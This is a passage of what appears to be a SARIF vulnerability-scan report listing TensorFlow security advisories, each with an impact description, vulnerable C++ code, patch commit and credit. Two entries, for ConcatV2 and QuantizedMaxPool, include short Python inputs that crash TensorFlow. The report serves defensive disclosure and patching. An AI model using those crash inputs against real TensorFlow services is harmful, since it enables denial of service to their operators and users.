range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "8.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23558",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23558"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23558",
              "help": {
                "text": "Vulnerability CVE-2022-23558\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23558)\n### Impact \nAn attacker can craft a TFLite model that would cause an integer overflow [in `TfLiteIntArrayCreate`](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/c/common.c#L53-L60):\n\n```cc\nTfLiteIntArray* TfLiteIntArrayCreate(int size) {\n  int alloc_size = TfLiteIntArrayGetSizeInBytes(size);\n  // ...\n  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);\n  // ...\n} \n```\n\nThe [`TfLiteIntArrayGetSizeInBytes`](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/c/common.c#L24-L33) returns an `int` instead of a `size_t`:\n\n```cc\nint TfLiteIntArrayGetSizeInBytes(int size) {\n  static TfLiteIntArray dummy;\n\n  int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;\n#if defined(_MSC_VER)\n  // Context for why this is needed is in http://b/189926408#comment21\n  computed_size -= sizeof(dummy.data[0]);\n#endif\n  return computed_size;\n}\n```\n\nAn attacker can control model inputs such that `computed_size` overflows the size of `int` datatype.\n\n### Patches\nWe have patched the issue in GitHub commit [a1e1511dde36b3f8aa27a6ec630838e7ea40e091](https://github.com/tensorflow/tensorflow/commit/a1e1511dde36b3f8aa27a6ec630838e7ea40e091).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-23558**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23558)|\n\n### Impact \nAn attacker can craft a TFLite model that would cause an integer overflow [in `TfLiteIntArrayCreate`](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/c/common.c#L53-L60):\n\n```cc\nTfLiteIntArray* TfLiteIntArrayCreate(int size) {\n  int alloc_size = TfLiteIntArrayGetSizeInBytes(size);\n  // ...\n  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);\n  // ...\n} \n```\n\nThe [`TfLiteIntArrayGetSizeInBytes`](https://github.com/tensorflow/tensorflow/blob/ca6f96b62ad84207fbec580404eaa7dd7403a550/tensorflow/lite/c/common.c#L24-L33) returns an `int` instead of a `size_t`:\n\n```cc\nint TfLiteIntArrayGetSizeInBytes(int size) {\n  static TfLiteIntArray dummy;\n\n  int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;\n#if defined(_MSC_VER)\n  // Context for why this is needed is in http://b/189926408#comment21\n  computed_size -= sizeof(dummy.data[0]);\n#endif\n  return computed_size;\n}\n```\n\nAn attacker can control model inputs such that `computed_size` overflows the size of `int` datatype.\n\n### Patches\nWe have patched the issue in GitHub commit [a1e1511dde36b3f8aa27a6ec630838e7ea40e091](https://github.com/tensorflow/tensorflow/commit/a1e1511dde36b3f8aa27a6ec630838e7ea40e091).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21731",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21731"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21731",
              "help": {
                "text": "Vulnerability CVE-2022-21731\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21731](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21731)\n### Impact \nThe [implementation of shape inference for `ConcatV2`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/common_shape_fns.cc#L1961-L2059) can be used to trigger a denial of service attack via a segfault caused by a type confusion:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ConcatV2(\n    values=[[1,2,3],[4,5,6]],\n    axis = 0xb500005b)\n  return y\n\ntest()\n```\n\nThe `axis` argument is translated into `concat_dim` in the `ConcatShapeHelper` helper function. Then, a value for `min_rank` is computed based on `concat_dim`. This is then used to validate that the `values` tensor has at least the required rank:\n\n```cc\n  int64_t concat_dim;\n  if (concat_dim_t-\u003edtype() == DT_INT32) {\n    concat_dim = static_cast\u003cint64_t\u003e(concat_dim_t-\u003eflat\u003cint32\u003e()(0));\n  } else {\n    concat_dim = concat_dim_t-\u003eflat\u003cint64_t\u003e()(0);\n  }\n\n  // Minimum required number of dimensions.\n  const int min_rank = concat_dim \u003c 0 ? -concat_dim : concat_dim + 1;\n\n  // ...\n  ShapeHandle input = c-\u003einput(end_value_index - 1);\n  TF_RETURN_IF_ERROR(c-\u003eWithRankAtLeast(input, min_rank, \u0026input));\n```\n\nHowever, [`WithRankAtLeast`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.cc#L345-L358) receives the lower bound as a 64-bits value and then compares it against the maximum 32-bits integer value that could be represented:\n\n```cc\nStatus InferenceContext::WithRankAtLeast(ShapeHandle shape, int64_t rank,\n                                         ShapeHandle* out) {\n  if (rank \u003e kint32max) {\n    return errors::InvalidArgument(\"Rank cannot exceed kint32max\");\n  }\n  // ...\n}\n```\n\nDue to the fact that `min_rank` is a 32-bits value and the value of `axis`, the `rank` argument is a [negative value](https://godbolt.org/z/Gcr5haMob), so the error check is bypassed.\n\n### Patches\nWe have patched the issue in GitHub commit [08d7b00c0a5a20926363849f611729f53f3ec022](https://github.com/tensorflow/tensorflow/commit/08d7b00c0a5a20926363849f611729f53f3ec022).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21731**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21731](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21731)|\n\n### Impact \nThe [implementation of shape inference for `ConcatV2`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/common_shape_fns.cc#L1961-L2059) can be used to trigger a denial of service attack via a segfault caused by a type confusion:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ConcatV2(\n    values=[[1,2,3],[4,5,6]],\n    axis = 0xb500005b)\n  return y\n\ntest()\n```\n\nThe `axis` argument is translated into `concat_dim` in the `ConcatShapeHelper` helper function. Then, a value for `min_rank` is computed based on `concat_dim`. This is then used to validate that the `values` tensor has at least the required rank:\n\n```cc\n  int64_t concat_dim;\n  if (concat_dim_t-\u003edtype() == DT_INT32) {\n    concat_dim = static_cast\u003cint64_t\u003e(concat_dim_t-\u003eflat\u003cint32\u003e()(0));\n  } else {\n    concat_dim = concat_dim_t-\u003eflat\u003cint64_t\u003e()(0);\n  }\n\n  // Minimum required number of dimensions.\n  const int min_rank = concat_dim \u003c 0 ? -concat_dim : concat_dim + 1;\n\n  // ...\n  ShapeHandle input = c-\u003einput(end_value_index - 1);\n  TF_RETURN_IF_ERROR(c-\u003eWithRankAtLeast(input, min_rank, \u0026input));\n```\n\nHowever, [`WithRankAtLeast`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/framework/shape_inference.cc#L345-L358) receives the lower bound as a 64-bits value and then compares it against the maximum 32-bits integer value that could be represented:\n\n```cc\nStatus InferenceContext::WithRankAtLeast(ShapeHandle shape, int64_t rank,\n                                         ShapeHandle* out) {\n  if (rank \u003e kint32max) {\n    return errors::InvalidArgument(\"Rank cannot exceed kint32max\");\n  }\n  // ...\n}\n```\n\nDue to the fact that `min_rank` is a 32-bits value and the value of `axis`, the `rank` argument is a [negative value](https://godbolt.org/z/Gcr5haMob), so the error check is bypassed.\n\n### Patches\nWe have patched the issue in GitHub commit [08d7b00c0a5a20926363849f611729f53f3ec022](https://github.com/tensorflow/tensorflow/commit/08d7b00c0a5a20926363849f611729f53f3ec022).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "GHSA-wcv5-vrvr-3rx2",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-wcv5-vrvr-3rx2"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://github.com/advisories/GHSA-wcv5-vrvr-3rx2",
              "help": {
                "text": "Vulnerability GHSA-wcv5-vrvr-3rx2\nSeverity: medium\nFixed Version: 2.7.0\nLink: [GHSA-wcv5-vrvr-3rx2](https://github.com/advisories/GHSA-wcv5-vrvr-3rx2)\n### Impact\nThe Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L963-L1035):\n\n```cc\n  for (const auto\u0026 output_prop : output_props) {\n    const PartialTensorShape output_shape(output_prop.shape());\n    // ...\n  }\n```\n  \nThe `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).\n\n### Patches\nWe have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https://github.com/tensorflow/tensorflow/commit/be7b286d40bc68cb0b56f702186cc4837d508058).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability GHSA-wcv5-vrvr-3rx2**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[GHSA-wcv5-vrvr-3rx2](https://github.com/advisories/GHSA-wcv5-vrvr-3rx2)|\n\n### Impact\nThe Grappler component of TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) in [constant folding](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L963-L1035):\n\n```cc\n  for (const auto\u0026 output_prop : output_props) {\n    const PartialTensorShape output_shape(output_prop.shape());\n    // ...\n  }\n```\n  \nThe `output_prop` tensor has a shape that is controlled by user input and this can result in triggering one of the `CHECK`s in the `PartialTensorShape` constructor. This is an instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).\n\n### Patches\nWe have patched the issue in GitHub commit [be7b286d40bc68cb0b56f702186cc4837d508058](https://github.com/tensorflow/tensorflow/commit/be7b286d40bc68cb0b56f702186cc4837d508058).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23578",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23578"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23578",
              "help": {
                "text": "Vulnerability CVE-2022-23578\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23578](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23578)\n### Impact\nIf a graph node is invalid, TensorFlow can leak memory in the [implementation of `ImmutableExecutorState::Initialize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/common_runtime/immutable_executor_state.cc#L84-L262):\n\n```cc\nStatus s = params_.create_kernel(n-\u003eproperties(), \u0026item-\u003ekernel);\nif (!s.ok()) {\n  item-\u003ekernel = nullptr;\n  s = AttachDef(s, *n);\n  return s;           \n}                     \n```\n\nHere, we set `item-\u003ekernel` to `nullptr` but it is a simple `OpKernel*` pointer so the memory that was previously allocated to it would leak.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd](https://github.com/tensorflow/tensorflow/commit/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23578**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23578](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23578)|\n\n### Impact\nIf a graph node is invalid, TensorFlow can leak memory in the [implementation of `ImmutableExecutorState::Initialize`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/common_runtime/immutable_executor_state.cc#L84-L262):\n\n```cc\nStatus s = params_.create_kernel(n-\u003eproperties(), \u0026item-\u003ekernel);\nif (!s.ok()) {\n  item-\u003ekernel = nullptr;\n  s = AttachDef(s, *n);\n  return s;           \n}                     \n```\n\nHere, we set `item-\u003ekernel` to `nullptr` but it is a simple `OpKernel*` pointer so the memory that was previously allocated to it would leak.\n\n### Patches\nWe have patched the issue in GitHub commit [c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd](https://github.com/tensorflow/tensorflow/commit/c79ccba517dbb1a0ccb9b01ee3bd2a63748b60dd).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "4.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23565",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23565"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23565",
              "help": {
                "text": "Vulnerability CVE-2022-23565\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23565](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23565)\n### Impact\nAn attacker can trigger denial of service via assertion failure by altering a `SavedModel` on disk such that `AttrDef`s of some operation are duplicated.\n\n### Patches\nWe have patched the issue in GitHub commit [c2b31ff2d3151acb230edc3f5b1832d2c713a9e0](https://github.com/tensorflow/tensorflow/commit/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23565**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23565](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23565)|\n\n### Impact\nAn attacker can trigger denial of service via assertion failure by altering a `SavedModel` on disk such that `AttrDef`s of some operation are duplicated.\n\n### Patches\nWe have patched the issue in GitHub commit [c2b31ff2d3151acb230edc3f5b1832d2c713a9e0](https://github.com/tensorflow/tensorflow/commit/c2b31ff2d3151acb230edc3f5b1832d2c713a9e0).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21739",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21739"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21739",
              "help": {
                "text": "Vulnerability CVE-2022-21739\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21739)\n### Impact \nThe [implementation of `QuantizedMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/quantized_pooling_ops.cc#L114-L130) has an undefined behavior where user controlled inputs can trigger a reference binding to null pointer.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizedMaxPool(\n    input = tf.constant([[[[4]]]], dtype=tf.quint8),\n    min_input = [],\n    max_input = [1],\n    ksize = [1, 1, 1, 1],\n    strides = [1, 1, 1, 1],\n    padding = \"SAME\", name=None\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [53b0dd6dc5957652f35964af16b892ec9af4a559](https://github.com/tensorflow/tensorflow/commit/53b0dd6dc5957652f35964af16b892ec9af4a559).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-21739**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21739)|\n\n### Impact \nThe [implementation of `QuantizedMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/quantized_pooling_ops.cc#L114-L130) has an undefined behavior where user controlled inputs can trigger a reference binding to null pointer.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizedMaxPool(\n    input = tf.constant([[[[4]]]], dtype=tf.quint8),\n    min_input = [],\n    max_input = [1],\n    ksize = [1, 1, 1, 1],\n    strides = [1, 1, 1, 1],\n    padding = \"SAME\", name=None\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [53b0dd6dc5957652f35964af16b892ec9af4a559](https://github.com/tensorflow/tensorflow/commit/53b0dd6dc5957652f35964af16b892ec9af4a559).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23577",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23577"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23577",
              "help": {
                "text": "Vulnerability CVE-2022-23577\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23577)\n### Impact\nThe [implementation of `GetInitOp`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/cc/saved_model/loader_util.cc#L31-L61) is vulnerable to a crash caused by dereferencing a null pointer:\n\n```cc\nconst auto\u0026 init_op_sig_it =\n    meta_graph_def.signature_def().find(kSavedModelInitOpSignatureKey);\nif (init_op_sig_it != sig_def_map.end()) {\n  *init_op_name = init_op_sig_it-\u003esecond.outputs()\n                      .find(kSavedModelInitOpSignatureKey)\n                      -\u003esecond.name();\n  return Status::OK();\n}\n```\n\nHere, we have a nested map and we assume that if the first `.find` succeeds then so would be the search in the internal map. However, the maps are built based on the `SavedModel` protobuf format and a malicious user can alter that on disk before loading to cause the second `.find` to return `nullptr`.\n### Patches\nWe have patched the issue in GitHub commit [4f38b1ac8e42727e18a2f0bde06d3bee8e77b250](https://github.com/tensorflow/tensorflow/commit/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23577**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23577)|\n\n### Impact\nThe [implementation of `GetInitOp`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/cc/saved_model/loader_util.cc#L31-L61) is vulnerable to a crash caused by dereferencing a null pointer:\n\n```cc\nconst auto\u0026 init_op_sig_it =\n    meta_graph_def.signature_def().find(kSavedModelInitOpSignatureKey);\nif (init_op_sig_it != sig_def_map.end()) {\n  *init_op_name = init_op_sig_it-\u003esecond.outputs()\n                      .find(kSavedModelInitOpSignatureKey)\n                      -\u003esecond.name();\n  return Status::OK();\n}\n```\n\nHere, we have a nested map and we assume that if the first `.find` succeeds then so would be the search in the internal map. However, the maps are built based on the `SavedModel` protobuf format and a malicious user can alter that on disk before loading to cause the second `.find` to return `nullptr`.\n### Patches\nWe have patched the issue in GitHub commit [4f38b1ac8e42727e18a2f0bde06d3bee8e77b250](https://github.com/tensorflow/tensorflow/commit/4f38b1ac8e42727e18a2f0bde06d3bee8e77b250).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23566",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23566"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23566",
              "help": {
                "text": "Vulnerability CVE-2022-23566\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23566](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23566)\n### Impact\nTensorFlow is vulnerable to a heap OOB write in [Grappler](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/graph_properties.cc#L1132-L1141):\n\n```cc\nStatus SetUnknownShape(const NodeDef* node, int output_port) {\n  shape_inference::ShapeHandle shape = \n      GetUnknownOutputShape(node, output_port);\n  InferenceContext* ctx = GetContext(node);\n  if (ctx == nullptr) {\n    return errors::InvalidArgument(\"Missing context\");\n  }\n  ctx-\u003eset_output(output_port, shape);\n  return Status::OK();\n}\n```\n\nThe [`set_output`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.h#L394) function writes to an array at the specified index:\n\n```cc\nvoid set_output(int idx, ShapeHandle shape) { outputs_.at(idx) = shape; }\n```\n\nHence, this gives a malicious user a write primitive.\n\n### Patches\nWe have patched the issue in GitHub commit [97282c6d0d34476b6ba033f961590b783fa184cd](https://github.com/tensorflow/tensorflow/commit/97282c6d0d34476b6ba033f961590b783fa184cd).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23566**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23566](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23566)|\n\n### Impact\nTensorFlow is vulnerable to a heap OOB write in [Grappler](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/costs/graph_properties.cc#L1132-L1141):\n\n```cc\nStatus SetUnknownShape(const NodeDef* node, int output_port) {\n  shape_inference::ShapeHandle shape = \n      GetUnknownOutputShape(node, output_port);\n  InferenceContext* ctx = GetContext(node);\n  if (ctx == nullptr) {\n    return errors::InvalidArgument(\"Missing context\");\n  }\n  ctx-\u003eset_output(output_port, shape);\n  return Status::OK();\n}\n```\n\nThe [`set_output`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.h#L394) function writes to an array at the specified index:\n\n```cc\nvoid set_output(int idx, ShapeHandle shape) { outputs_.at(idx) = shape; }\n```\n\nHence, this gives a malicious user a write primitive.\n\n### Patches\nWe have patched the issue in GitHub commit [97282c6d0d34476b6ba033f961590b783fa184cd](https://github.com/tensorflow/tensorflow/commit/97282c6d0d34476b6ba033f961590b783fa184cd).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "8.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21734",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21734"
              },
              "defaultConfiguration": {
                "level": "error"
